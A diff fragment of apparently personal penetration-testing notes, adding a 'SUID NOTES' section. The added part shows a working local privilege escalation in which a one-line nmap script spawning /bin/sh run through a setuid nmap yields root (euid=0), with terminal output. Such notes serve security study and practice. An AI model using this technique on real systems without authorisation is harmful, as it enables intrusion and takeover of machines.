@@ -799,6 +799,16 @@ gather sensitive data stored in log files or enumerate user actions and running 
 finging the groups
 find / -group groupx 2>/dev/null
 ```
+# SUID NOTES
+```bash
+nmap but no --interactive
+rabbitmq@clyde:/tmp$ echo "os.execute('/bin/sh')" > /tmp/shell.nse
+rabbitmq@clyde:/tmp$ nmap --script=/tmp/shell.nse
+WARNING: Running Nmap setuid, as you are doing, is a major security risk.
+# id
+uid=107 gid=112(rabbitmq) euid=0 groups=112(rabbitmq)
+
+```
 ### DOCKER WOES
 ```
 mount
